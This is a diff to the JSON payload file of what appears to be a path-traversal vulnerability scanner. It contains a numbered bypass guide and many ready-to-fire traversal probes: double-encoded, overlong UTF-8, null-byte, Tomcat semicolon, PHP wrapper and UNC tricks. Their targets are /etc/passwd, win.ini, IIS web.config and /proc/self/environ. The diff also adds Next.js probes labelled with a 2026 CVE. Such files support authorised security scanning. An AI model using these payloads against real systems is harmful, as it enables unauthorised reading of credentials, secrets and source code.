@@ -1,16 +1,16 @@
 {
   "category": "path_traversal",
   "craft_guidance": [
-    "1. IDENTIFY OS: Linux (/etc/passwd → root:x:), Windows (C:\\Windows\\win.ini → [fonts]), generic (boot.ini, .htpasswd).",
+    "1. IDENTIFY OS: Linux (/etc/passwd \u2192 root:x:), Windows (C:\\Windows\\win.ini \u2192 [fonts]), generic (boot.ini, .htpasswd).",
     "2. ENCODING ROUNDS: ../, ..%2f, %2e%2e%2f, %252e%252e%252f (double), ..\\..\\, ..%5c. Some servers decode N times; iterate.",
-    "3. FILTER BYPASS: filter strips `../` once → use `....//` or `..././` (filter removes inner, leaves outer). Filter requires .pdf? Try null byte `payload.pdf%00`, or `?file=../../etc/passwd?.pdf`.",
-    "4. ABSOLUTE PATH: skip relative — `/etc/passwd`, `file:///etc/passwd`, `C:\\Windows\\win.ini`.",
+    "3. FILTER BYPASS: filter strips `../` once \u2192 use `....//` or `..././` (filter removes inner, leaves outer). Filter requires .pdf? Try null byte `payload.pdf%00`, or `?file=../../etc/passwd?.pdf`.",
+    "4. ABSOLUTE PATH: skip relative \u2014 `/etc/passwd`, `file:///etc/passwd`, `C:\\Windows\\win.ini`.",
     "5. UNICODE / ZERO-WIDTH: `..\\u002f`, `..\\xc0\\xaf`, RTL override `\\u202e`. Older Java/PHP interpret some.",
     "6. WRAPPERS: PHP `php://filter/convert.base64-encode/resource=index.php` reads source. `data://`, `expect://`, `phar://` for RCE-adjacent abuse.",
-    "7. WINDOWS UNC: `\\\\attacker\\share\\file` — SSRF / NTLM hash leak via SMB.",
+    "7. WINDOWS UNC: `\\\\attacker\\share\\file` \u2014 SSRF / NTLM hash leak via SMB.",
     "8. AUTOMATIC NORMALIZATION: trailing `/.` or `/. /` confuses routers. `app.js/.` may serve source.",
-    "9. SINK CONFIRMATION: `root:x:`, `[fonts]`, `daemon:`, `/bin/bash` — semantic match, not status alone.",
-    "10. SYMLINK LOOPS: `/proc/self/cwd/`, `/proc/self/environ`, `/proc/self/cmdline` — process intel for chaining."
+    "9. SINK CONFIRMATION: `root:x:`, `[fonts]`, `daemon:`, `/bin/bash` \u2014 semantic match, not status alone.",
+    "10. SYMLINK LOOPS: `/proc/self/cwd/`, `/proc/self/environ`, `/proc/self/cmdline` \u2014 process intel for chaining."
   ],
   "contexts": {
     "linux": {
@@ -120,7 +120,7 @@
         },
         {
           "payload": "/var/www/images/../../../../etc/passwd",
-          "description": "Start-of-path validation bypass — when the app requires the resolved/supplied path to BEGIN with an expected base directory (e.g. /var/www/images/), prefix that exact base so the startsWith check passes, then traverse back out with ../ to reach /etc/passwd. The prefix satisfies the validator; the OS collapses the traversal after it.",
+          "description": "Start-of-path validation bypass \u2014 when the app requires the resolved/supplied path to BEGIN with an expected base directory (e.g. /var/www/images/), prefix that exact base so the startsWith check passes, then traverse back out with ../ to reach /etc/passwd. The prefix satisfies the validator; the OS collapses the traversal after it.",
           "matchers": [
             {
               "type": "word",
@@ -256,7 +256,7 @@
       "probes": [
         {
           "payload": "%252e%252e%252fetc/passwd",
-          "description": "Double URL-encoded traversal — %25 decodes to %, then second pass decodes %2e to . and %2f to /",
+          "description": "Double URL-encoded traversal \u2014 %25 decodes to %, then second pass decodes %2e to . and %2f to /",
           "matchers": [
             {
               "type": "word",
@@ -273,7 +273,7 @@
         },
         {
           "payload": "..%c0%afetc/passwd",
-          "description": "Overlong UTF-8 encoding of / (0xc0 0xaf) — bypasses decoders that only check standard %2f",
+          "description": "Overlong UTF-8 encoding of / (0xc0 0xaf) \u2014 bypasses decoders that only check standard %2f",
           "matchers": [
             {
               "type": "word",
@@ -290,7 +290,7 @@
         },
         {
           "payload": "....//....//....//etc/passwd",
-          "description": "Double-dot double-slash bypass — after stripping ../ the remaining ../  still traverses",
+          "description": "Double-dot double-slash bypass \u2014 after stripping ../ the remaining ../  still traverses",
           "matchers": [
             {
               "type": "word",
@@ -307,7 +307,7 @@
         },
         {
           "payload": "..;/etc/passwd",
-          "description": "Semicolon bypass targeting Tomcat — Tomcat treats semicolon as path parameter separator, allowing traversal past it",
+          "description": "Semicolon bypass targeting Tomcat \u2014 Tomcat treats semicolon as path parameter separator, allowing traversal past it",
           "matchers": [
             {
               "type": "word",
@@ -324,7 +324,7 @@
         },
         {
           "payload": "..\\/etc/passwd",
-          "description": "Backslash-forward-slash mixed separator — some Windows-ported parsers normalise both separators",
+          "description": "Backslash-forward-slash mixed separator \u2014 some Windows-ported parsers normalise both separators",
           "matchers": [
             {
               "type": "word",
@@ -342,7 +342,7 @@
       ]
     },
     "null_byte": {
-      "description": "Null byte injection for path traversal — terminates strings early to bypass extension and suffix checks",
+      "description": "Null byte injection for path traversal \u2014 terminates strings early to bypass extension and suffix checks",
       "tech_match": [
         "PHP",
         "Apache",
@@ -366,7 +366,7 @@
       "probes": [
         {
           "payload": "../../../etc/passwd%00.jpg",
-          "description": "Null byte extension bypass — %00 terminates the C string, stripping the .jpg suffix before file open",
+          "description": "Null byte extension bypass \u2014 %00 terminates the C string, stripping the .jpg suffix before file open",
           "matchers": [
             {
               "type": "word",
@@ -383,7 +383,7 @@
         },
         {
           "payload": "../../../etc/passwd%00",
-          "description": "Null byte path terminator — nullifies any suffix appended by the application after the parameter",
+          "description": "Null byte path terminator \u2014 nullifies any suffix appended by the application after the parameter",
           "matchers": [
             {
               "type": "word",
@@ -401,7 +401,7 @@
       ]
     },
     "windows_specific": {
-      "description": "Additional Windows-specific path traversal targets — hosts file and IIS web.config",
+      "description": "Additional Windows-specific path traversal targets \u2014 hosts file and IIS web.config",
       "tech_match": [
         "IIS",
         "ASP.NET"
@@ -424,7 +424,7 @@
       "probes": [
         {
           "payload": "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
-          "description": "Windows hosts file path traversal — loopback and domain entries confirm read access",
+          "description": "Windows hosts file path traversal \u2014 loopback and domain entries confirm read access",
           "matchers": [
             {
               "type": "word",
@@ -441,7 +441,7 @@
         },
         {
           "payload": "..\\..\\..\\inetpub\\wwwroot\\web.config",
-          "description": "IIS web.config traversal — connection strings and app secrets confirm sensitive file read",
+          "description": "IIS web.config traversal \u2014 connection strings and app secrets confirm sensitive file read",
           "matchers": [
             {
               "type": "word",
@@ -460,7 +460,7 @@
       ]
     },
     "encoding_bypass_variants_2025": {
-      "description": "2025 path-traversal encoding variants — UTF-8 overlong, mixed slashes, double-backslash. Bypasses naive ../ filters.",
+      "description": "2025 path-traversal encoding variants \u2014 UTF-8 overlong, mixed slashes, double-backslash. Bypasses naive ../ filters.",
       "tech_match": [],
       "param_match": [
         "file",
@@ -472,7 +472,7 @@
       "probes": [
         {
           "payload": "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
-          "description": "UTF-8 overlong dot encoding — %c0%ae = . in some parsers",
+          "description": "UTF-8 overlong dot encoding \u2014 %c0%ae = . in some parsers",
           "matchers": [
             {
               "type": "regex",
@@ -485,7 +485,7 @@
         },
         {
           "payload": "....//....//....//etc/passwd",
-          "description": "Dot-dot-bypass via sequential dots + double slash — bypasses single ../ strip",
+          "description": "Dot-dot-bypass via sequential dots + double slash \u2014 bypasses single ../ strip",
           "matchers": [
             {
               "type": "regex",
@@ -508,6 +508,83 @@
           "severity": "high",
           "confidence_boost": 60,
           "variables": {}
+        }
+      ]
+    },
+    "nextjs_windows_path_traversal_2026": {
+      "description": "CVE-2026-75604: Next.js RCE via Windows path traversal. The Next.js router on Windows does not normalize backslashes, allowing traversal out of the public directory to read arbitrary files or reach internal API routes.",
+      "tech_match": [
+        "nextjs",
+        "next.js",
+        "next",
+        "vercel"
+      ],
+      "probes": [
+        {
+          "payload": "/_next/../../../../../windows/win.ini",
+          "description": "Path traversal via /_next/ prefix to reach Windows system files. [fonts] section confirms file read.",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "[fonts]",
+                "[extensions]",
+                "[mci extensions]"
+              ]
+            },
+            {
+              "type": "status",
+              "status": 200
+            }
+          ]
+        },
+        {
+          "payload": "/_next/..\\..\\..\\..\\..\\windows\\win.ini",
+          "description": "Backslash variant \u2014 Windows path separator bypasses forward-slash normalization.",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "[fonts]",
+                "[extensions]"
+              ]
+            },
+            {
+              "type": "status",
+              "status": 200
+            }
+          ]
+        },
+        {
+          "payload": "/_next/%5C..%5C..%5C..%5C..%5Cwindows%5Cwin.ini",
+          "description": "URL-encoded backslash variant \u2014 double-decode bypass on some middleware.",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "[fonts]",
+                "[extensions]"
+              ]
+            },
+            {
+              "type": "status",
+              "status": 200
+            }
+          ]
+        },
+        {
+          "payload": "/_next/../../../../../etc/passwd",
+          "description": "Linux variant \u2014 same traversal pattern for Linux-hosted Next.js servers.",
+          "matchers": [
+            {
+              "type": "regex",
+              "pattern": "root:.{0,20}:/bin/"
+            },
+            {
+              "type": "status",
+              "status": 200
+            }
+          ]
         }
       ]
     }
